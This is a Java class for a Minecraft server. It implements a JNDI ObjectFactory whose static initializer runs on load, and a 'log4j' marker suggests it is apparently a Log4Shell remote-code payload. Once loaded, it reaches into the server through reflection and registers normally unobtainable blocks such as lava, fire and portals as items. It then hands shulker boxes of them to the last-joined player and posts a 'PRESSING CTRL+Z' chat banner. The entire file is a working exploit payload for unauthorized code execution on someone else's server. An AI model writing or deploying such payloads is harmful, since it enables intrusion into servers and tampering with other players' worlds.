import net.minecraft.block.Block;
import net.minecraft.command.CommandBase;
import net.minecraft.command.ServerCommandManager;
import net.minecraft.creativetab.CreativeTabs;
import net.minecraft.entity.item.EntityItem;
import net.minecraft.entity.player.EntityPlayerMP;
import net.minecraft.init.Blocks;
import net.minecraft.item.Item;
import net.minecraft.item.ItemBlock;
import net.minecraft.item.ItemStack;
import net.minecraft.nbt.NBTTagCompound;
import net.minecraft.nbt.NBTTagList;
import net.minecraft.network.play.server.SPacketChat;
import net.minecraft.server.MinecraftServer;
import net.minecraft.util.ResourceLocation;
import net.minecraft.util.text.ChatType;
import net.minecraft.util.text.TextComponentString;

import javax.naming.Context;
import javax.naming.Name;
import javax.naming.spi.ObjectFactory;
import java.lang.reflect.Field;
import java.util.Hashtable;
import java.util.Map;
import java.util.concurrent.Callable;

public class AddRemovedItems implements ObjectFactory {
    static {
        Callable submitToMain = () -> {
            Field managerF = CommandBase.class.getDeclaredField("a");
            managerF.setAccessible(true);
            ServerCommandManager manager = (ServerCommandManager)managerF.get(null);
            Field serverF = ServerCommandManager.class.getDeclaredField("a");
            serverF.setAccessible(true);
            MinecraftServer server = (MinecraftServer)serverF.get(manager);

            int lastIndex = server.getPlayerList().getPlayerList().size()-1;
            if (lastIndex == -1) {
                return null;
            }
            EntityPlayerMP me = server.getPlayerList().getPlayerList().get(lastIndex);

            //EntityPlayerMP me = server.getPlayerList().getPlayerByUsername("Captain_S0L0");

            if (me != null) {
                me.connection.sendPacket(new SPacketChat(new TextComponentString("\u00a75\u00a7k-|-\u00a74\u00a7l\u00a7nPRESSING CTRL+Z...\u00a75\u00a7k-|-"), ChatType.SYSTEM));

                register(8,"flowing_water",Blocks.FLOWING_WATER);
                register(8, "flowing_water", Blocks.FLOWING_WATER);
                register(9, "water", Blocks.WATER);
                register(10, "flowing_lava", Blocks.FLOWING_LAVA);
                register(11, "lava", Blocks.LAVA);
                register(26, "bed_block", Blocks.BED);
                register(34, "piston_head", Blocks.PISTON_HEAD);
                register(36, "piston_extension", Blocks.PISTON_EXTENSION);
                register(43, "double_stone_slab", Blocks.DOUBLE_STONE_SLAB);
                register(51, "fire", Blocks.FIRE);
                register(55, "redstone_wire", Blocks.REDSTONE_WIRE);
                register(59, "wheat_block", Blocks.WHEAT);
                register(62, "lit_furnace", Blocks.LIT_FURNACE);
                register(63, "standing_sign", Blocks.STANDING_SIGN);
                register(64, "wooden_door_block", Blocks.OAK_DOOR);
                register(68, "wall_sign", Blocks.WALL_SIGN);
                register(74, "lit_redstone_ore", Blocks.LIT_REDSTONE_ORE);
                register(75, "unlit_redstone_torch", Blocks.UNLIT_REDSTONE_TORCH);
                register(83, "reeds_block", Blocks.REEDS);
                register(90, "portal", Blocks.PORTAL);
                register(92, "cake_block", Blocks.CAKE);
                register(93, "unpowered_repeater", Blocks.UNPOWERED_REPEATER);
                register(94, "powered_repeater", Blocks.POWERED_REPEATER);
                register(104, "pumpkin_stem", Blocks.PUMPKIN_STEM);
                register(105, "melon_stem", Blocks.MELON_STEM);
                register(115, "nether_wart_crop", Blocks.NETHER_WART);
                register(117, "brewing_stand_block", Blocks.BREWING_STAND);
                register(118, "cauldron_block", Blocks.CAULDRON);

                register(119, "end_portal", Blocks.END_PORTAL);
                register(124, "lit_redstone_lamp", Blocks.LIT_REDSTONE_LAMP);
                register(125, "double_wooden_slab", Blocks.DOUBLE_WOODEN_SLAB);
                register(127, "cocoa", Blocks.COCOA);
                register(132, "tripwire", Blocks.TRIPWIRE);
                register(140, "flower_pot_block", Blocks.FLOWER_POT);
                register(141, "carrots", Blocks.CARROTS);
                register(142, "potatoes", Blocks.POTATOES);
                register(144, "skull_block", Blocks.SKULL);
                register(149, "unpowered_comparator", Blocks.UNPOWERED_COMPARATOR);
                register(150, "powered_comparator", Blocks.POWERED_COMPARATOR);
                register(178, "daylight_detector_inverted", Blocks.DAYLIGHT_DETECTOR_INVERTED);
                register(181, "double_stone_slab2", Blocks.DOUBLE_STONE_SLAB2);
                register(207, "beetroots", Blocks.BEETROOTS);
                register(209, "end_gateway", Blocks.END_GATEWAY);
                register(212, "frosted_ice", Blocks.FROSTED_ICE);

                ItemStack shulker;
                shulker = new ItemStack(Blocks.field_190975_dA);
                NBTTagCompound blockEntityTag;
                blockEntityTag = new NBTTagCompound();
                NBTTagList itemList;
                itemList = new NBTTagList();
                blockEntityTag.setTag("Items", itemList);
                byte slot = 0;
                NBTTagCompound item;
                item = new NBTTagCompound();
                item.setString("id","minecraft:flowing_water");
                item.setByte("Count", (byte)64);
                item.setByte("Slot",slot);
                slot++;
                itemList.appendTag(item);
                item = new NBTTagCompound();
                item.setString("id","minecraft:water");
                item.setByte("Count", (byte)64);
                item.setByte("Slot",slot);
                slot++;
                itemList.appendTag(item);
                item = new NBTTagCompound();
                item.setString("id","minecraft:flowing_lava");
                item.setByte("Count", (byte)64);
                item.setByte("Slot",slot);
                slot++;
                itemList.appendTag(item);
                item = new NBTTagCompound();
                item.setString("id","minecraft:lava");
                item.setByte("Count", (byte)64);
                item.setByte("Slot",slot);
                slot++;
                itemList.appendTag(item);
                item = new NBTTagCompound();
                item.setString("id","minecraft:bed_block");
                item.setByte("Count", (byte)64);
                item.setByte("Slot",slot);
                slot++;
                itemList.appendTag(item);
                item = new NBTTagCompound();
                item.setString("id","minecraft:piston_head");
                item.setByte("Count", (byte)64);
                item.setByte("Slot",slot);
                slot++;
                itemList.appendTag(item);
                item = new NBTTagCompound();
                item.setString("id","minecraft:piston_extension");
                item.setByte("Count", (byte)64);
                item.setByte("Slot",slot);
                slot++;
                itemList.appendTag(item);
                item = new NBTTagCompound();
                item.setString("id","minecraft:double_stone_slab");
                item.setByte("Count", (byte)64);
                item.setByte("Slot",slot);
                slot++;
                itemList.appendTag(item);
                item = new NBTTagCompound();
                item.setString("id","minecraft:fire");
                item.setByte("Count", (byte)64);
                item.setByte("Slot",slot);
                slot++;
                itemList.appendTag(item);
                item = new NBTTagCompound();
                item.setString("id","minecraft:redstone_wire");
                item.setByte("Count", (byte)64);
                item.setByte("Slot",slot);
                slot++;
                itemList.appendTag(item);
                item = new NBTTagCompound();
                item.setString("id","minecraft:wheat_block");
                item.setByte("Count", (byte)64);
                item.setByte("Slot",slot);
                slot++;
                itemList.appendTag(item);
                item = new NBTTagCompound();
                item.setString("id","minecraft:lit_furnace");
                item.setByte("Count", (byte)64);
                item.setByte("Slot",slot);
                slot++;
                itemList.appendTag(item);
                item = new NBTTagCompound();
                item.setString("id","minecraft:standing_sign");
                item.setByte("Count", (byte)64);
                item.setByte("Slot",slot);
                slot++;
                itemList.appendTag(item);
                item = new NBTTagCompound();
                item.setString("id","minecraft:wooden_door_block");
                item.setByte("Count", (byte)64);
                item.setByte("Slot",slot);
                slot++;
                itemList.appendTag(item);
                item = new NBTTagCompound();
                item.setString("id","minecraft:wall_sign");
                item.setByte("Count", (byte)64);
                item.setByte("Slot",slot);
                slot++;
                itemList.appendTag(item);
                item = new NBTTagCompound();
                item.setString("id","minecraft:lit_redstone_ore");
                item.setByte("Count", (byte)64);
                item.setByte("Slot",slot);
                slot++;
                itemList.appendTag(item);
                item = new NBTTagCompound();
                item.setString("id","minecraft:unlit_redstone_torch");
                item.setByte("Count", (byte)64);
                item.setByte("Slot",slot);
                slot++;
                itemList.appendTag(item);
                item = new NBTTagCompound();
                item.setString("id","minecraft:reeds_block");
                item.setByte("Count", (byte)64);
                item.setByte("Slot",slot);
                slot++;
                itemList.appendTag(item);
                item = new NBTTagCompound();
                item.setString("id","minecraft:portal");
                item.setByte("Count", (byte)64);
                item.setByte("Slot",slot);
                slot++;
                itemList.appendTag(item);
                item = new NBTTagCompound();
                item.setString("id","minecraft:cake_block");
                item.setByte("Count", (byte)64);
                item.setByte("Slot",slot);
                slot++;
                itemList.appendTag(item);
                item = new NBTTagCompound();
                item.setString("id","minecraft:unpowered_repeater");
                item.setByte("Count", (byte)64);
                item.setByte("Slot",slot);
                slot++;
                itemList.appendTag(item);
                item = new NBTTagCompound();
                item.setString("id","minecraft:powered_repeater");
                item.setByte("Count", (byte)64);
                item.setByte("Slot",slot);
                slot++;
                itemList.appendTag(item);
                item = new NBTTagCompound();
                item.setString("id","minecraft:pumpkin_stem");
                item.setByte("Count", (byte)64);
                item.setByte("Slot",slot);
                slot++;
                itemList.appendTag(item);
                item = new NBTTagCompound();
                item.setString("id","minecraft:melon_stem");
                item.setByte("Count", (byte)64);
                item.setByte("Slot",slot);
                slot++;
                itemList.appendTag(item);
                item = new NBTTagCompound();
                item.setString("id","minecraft:nether_wart_crop");
                item.setByte("Count", (byte)64);
                item.setByte("Slot",slot);
                slot++;
                itemList.appendTag(item);
                item = new NBTTagCompound();
                item.setString("id","minecraft:brewing_stand_block");
                item.setByte("Count", (byte)64);
                item.setByte("Slot",slot);
                slot++;
                itemList.appendTag(item);
                item = new NBTTagCompound();
                item.setString("id","minecraft:cauldron_block");
                item.setByte("Count", (byte)64);
                item.setByte("Slot",slot);
                itemList.appendTag(item);

                shulker.setTagInfo("BlockEntityTag", blockEntityTag);
                me.getServerWorld().spawnEntityInWorld(new EntityItem(me.getServerWorld(), me.posX, me.posY, me.posZ, shulker));

                shulker = new ItemStack(Blocks.field_190975_dA);

                blockEntityTag = new NBTTagCompound();
                itemList = new NBTTagList();
                blockEntityTag.setTag("Items", itemList);
                slot = 0;

                item = new NBTTagCompound();
                item.setString("id","minecraft:end_portal");
                item.setByte("Count", (byte)64);
                item.setByte("Slot",slot);
                slot++;
                itemList.appendTag(item);
                item = new NBTTagCompound();
                item.setString("id","minecraft:lit_redstone_lamp");
                item.setByte("Count", (byte)64);
                item.setByte("Slot",slot);
                slot++;
                itemList.appendTag(item);
                item = new NBTTagCompound();
                item.setString("id","minecraft:double_wooden_slab");
                item.setByte("Count", (byte)64);
                item.setByte("Slot",slot);
                slot++;
                itemList.appendTag(item);
                item = new NBTTagCompound();
                item.setString("id","minecraft:cocoa");
                item.setByte("Count", (byte)64);
                item.setByte("Slot",slot);
                slot++;
                itemList.appendTag(item);
                item = new NBTTagCompound();
                item.setString("id","minecraft:tripwire");
                item.setByte("Count", (byte)64);
                item.setByte("Slot",slot);
                slot++;
                itemList.appendTag(item);
                item = new NBTTagCompound();
                item.setString("id","minecraft:flower_pot_block");
                item.setByte("Count", (byte)64);
                item.setByte("Slot",slot);
                slot++;
                itemList.appendTag(item);
                item = new NBTTagCompound();
                item.setString("id","minecraft:carrots");
                item.setByte("Count", (byte)64);
                item.setByte("Slot",slot);
                slot++;
                itemList.appendTag(item);
                item = new NBTTagCompound();
                item.setString("id","minecraft:potatoes");
                item.setByte("Count", (byte)64);
                item.setByte("Slot",slot);
                slot++;
                itemList.appendTag(item);
                item = new NBTTagCompound();
                item.setString("id","minecraft:skull_block");
                item.setByte("Count", (byte)64);
                item.setByte("Slot",slot);
                slot++;
                itemList.appendTag(item);
                item = new NBTTagCompound();
                item.setString("id","minecraft:unpowered_comparator");
                item.setByte("Count", (byte)64);
                item.setByte("Slot",slot);
                slot++;
                itemList.appendTag(item);
                item = new NBTTagCompound();
                item.setString("id","minecraft:powered_comparator");
                item.setByte("Count", (byte)64);
                item.setByte("Slot",slot);
                slot++;
                itemList.appendTag(item);
                item = new NBTTagCompound();
                item.setString("id","minecraft:daylight_detector_inverted");
                item.setByte("Count", (byte)64);
                item.setByte("Slot",slot);
                slot++;
                itemList.appendTag(item);
                item = new NBTTagCompound();
                item.setString("id","minecraft:double_stone_slab2");
                item.setByte("Count", (byte)64);
                item.setByte("Slot",slot);
                slot++;
                itemList.appendTag(item);
                item = new NBTTagCompound();
                item.setString("id","minecraft:beetroots");
                item.setByte("Count", (byte)64);
                item.setByte("Slot",slot);
                slot++;
                itemList.appendTag(item);
                item = new NBTTagCompound();
                item.setString("id","minecraft:end_gateway");
                item.setByte("Count", (byte)64);
                item.setByte("Slot",slot);
                slot++;
                itemList.appendTag(item);
                item = new NBTTagCompound();
                item.setString("id","minecraft:frosted_ice");
                item.setByte("Count", (byte)64);
                item.setByte("Slot",slot);

                shulker.setTagInfo("BlockEntityTag", blockEntityTag);
                me.getServerWorld().spawnEntityInWorld(new EntityItem(me.getServerWorld(), me.posX, me.posY, me.posZ, shulker));

            }

            server.currentTask = null;
            return null;
        };

        Thread thread = new Thread(() -> {
            try {
                Field managerF = CommandBase.class.getDeclaredField("a");
                managerF.setAccessible(true);
                ServerCommandManager manager = (ServerCommandManager) managerF.get(null);
                Field serverF = ServerCommandManager.class.getDeclaredField("a");
                serverF.setAccessible(true);
                MinecraftServer server = (MinecraftServer) serverF.get(manager);

                if (server == null || !server.isServerRunning() || (server.currentTask != null && server.currentTask.equals("log4j"))) {
                    return;
                }
                server.currentTask = "log4j";
                server.callFromMainThread(submitToMain);
            }
            catch (Exception e) {
                e.printStackTrace();
            }
        });
        thread.start();
    }

    private static void register(int id, String registry, Block block) {
        block.setCreativeTab(CreativeTabs.BUILDING_BLOCKS);
        Item itemBlock = new ItemBlock(block).setCreativeTab(CreativeTabs.BUILDING_BLOCKS);
        Item.REGISTRY.register(id, new ResourceLocation(registry), itemBlock);

        try {
            Field f = Item.class.getDeclaredField("a");
            f.setAccessible(true);
            Map<Block, Item> map = (Map<Block, Item>)f.get(null);
            map.put(block, itemBlock);
        }
        catch (Exception e) {
            e.printStackTrace();
        }

    }

    @Override
    public Object getObjectInstance(Object obj, Name name, Context nameCtx, Hashtable<?, ?> environment) throws Exception {
        return this;
    }
}
